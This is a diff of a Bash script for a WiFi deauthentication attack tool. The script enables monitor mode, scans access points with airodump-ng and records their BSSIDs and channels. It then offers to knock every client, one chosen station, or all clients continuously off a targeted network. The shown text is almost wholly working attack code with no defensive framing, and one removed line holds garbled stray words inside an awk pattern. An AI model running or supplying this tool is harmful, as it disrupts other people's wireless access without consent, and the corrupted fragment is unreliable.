@@ -47,20 +47,19 @@ airmon-ng start "$IFACE" >/dev/null 2>&1 || true
 
 MON="${IFACE}mon"
 if [ ! -e "/sys/class/net/$MON" ]; then
-    # some drivers rename differently or stay same
     if iwconfig "$IFACE" 2>/dev/null | grep -qi "Mode:Monitor"; then
         MON="$IFACE"
     else
-        # try ip link based mon name
-        MON=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}' | grep -E 'mon|wlan' | tail -n1)
+        MON=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}' | grep -E 'mon' | tail -n1)
         [ -z "$MON" ] && MON="$IFACE"
     fi
 fi
 echo -e "${BLUE}[*] Using monitor iface: $MON${NC}"
 
 SCAN_FILE="$BASE_DIR/capture/deauth_scan_$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$BASE_DIR/capture"
 echo -e "${GREEN}[+] Scanning networks (15 seconds)...${NC}"
-timeout 15 airodump-ng --output-format csv,pcap -w "$SCAN_FILE" "$MON" 2>/dev/null || true
+timeout 15 airodump-ng --output-format csv -w "$SCAN_FILE" "$MON" 2>/dev/null || true
 
 CSV=$(ls -1 "${SCAN_FILE}"*.csv 2>/dev/null | head -n1)
 if [ -n "$CSV" ]; then
@@ -69,31 +68,25 @@ if [ -n "$CSV" ]; then
       BEGIN{printf "%-3s %-18s %-6s %-5s %-20s\n","#","BSSID","CH","PWR","ESSID"}
       /Station MAC/{exit}
       NR>2 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {
-        i++; b=$1; ch=$4; pwr=$9; ess=$14;
+        i++
+        b=$1; ch=$4; pwr=$9; ess=$14
         gsub(/^[ \t]+|[ \t]+$/,"",b)
         gsub(/^[ \t]+|[ \t]+$/,"",ch)
         gsub(/^[ \t]+|[ \t]+$/,"",pwr)
         gsub(/^[ \t]+|[ \t]+$/,"",ess)
         printf "%-3s %-18s %-6s %-5s %-20s\n", i, b, ch, pwr, ess
-        bssid[i]=b; channel[i]=ch; essid[i]=ess
-      }
-      END{
-        for (j=1;j<=i;j++) {
-          # write map file
-        }
       }' "$CSV"
 
-    # save map for selection
     awk -F',' '
       /Station MAC/{exit}
       NR>2 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ {
-        i++; b=$1; ch=$4; ess=$14;
+        i++
+        b=$1; ch=$4; ess=$14
         gsub(/^[ \t]+|[ \t]+$/,"",b)
         gsub(/^[ \t]+|[ \t]+$/,"",ch)
-        gsub(/^[ conductivity могут]+|[ \t]+$/,"",ess)
         gsub(/^[ \t]+|[ \t]+$/,"",ess)
         print i","b","ch","ess
-      }' "$CSV" > /tmp/wifitool_ap_map.txt 2>/dev/null
+      }' "$CSV" > /tmp/wifitool_ap_map.txt
 fi
 
 echo ""
@@ -118,7 +111,7 @@ iwconfig "$MON" channel "$CHANNEL" 2>/dev/null || iw dev "$MON" set channel "$CH
 
 echo ""
 echo -e "${YELLOW}Attack type:${NC}"
-echo "  1) Deauth ALL clients on AP (broadcast)"
+echo "  1) Deauth ALL clients on AP"
 echo "  2) Deauth ONE client (station MAC)"
 echo "  3) Continuous deauth forever (Ctrl+C stop)"
 read -rp "> " ATYPE
@@ -129,9 +122,8 @@ PKTS=${PKTS:-0}
 
 case "$ATYPE" in
     2)
-        # show stations briefly
-        echo -e "${GREEN}[+] Capturing stations 10s...${NC}"
-        timeout 10 airodump-ng --bssid "$BSSID" -c "$CHANNEL" "$MON" || true
+        echo -e "${GREEN}[+] Capturing stations 10s (watch airodump if opened)...${NC}"
+        timeout 10 airodump-ng --bssid "$BSSID" -c "$CHANNEL" --output-format csv -w "$BASE_DIR/capture/stations" "$MON" 2>/dev/null || true
         read -rp "Station MAC: " STATION
         [ -z "$STATION" ] && echo -e "${RED}Station required${NC}" && exit 1
         echo -e "${RED}[!] Deauth $STATION from $BSSID ...${NC}"
